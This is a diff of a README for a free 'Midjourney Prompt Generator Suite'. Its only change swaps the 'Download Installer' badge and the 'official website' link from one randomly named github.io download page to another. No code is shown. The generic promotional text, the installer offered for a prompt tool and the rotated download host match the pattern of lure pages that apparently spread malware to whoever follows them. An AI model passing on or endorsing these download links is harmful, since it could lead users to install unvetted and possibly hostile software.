@@ -2,7 +2,7 @@
 
 The Midjourney Prompt Generator Suite is an essential tool for anyone looking to enhance their Midjourney experience. This comprehensive prompt guide helps you create detailed and effective prompts, ensuring that you get the best results from Midjourney's AI image generation. Whether you're a beginner or an experienced user, our suite provides all the features you need to master the art of prompt crafting.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -65,7 +65,7 @@ A5: No, the Midjourney Prompt Generator Suite is completely free to use with no 
 
 For the latest version and updates, download the Midjourney Prompt Generator Suite from our official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 Alternatively, you can use the download button at the top of this page for quick access.
 
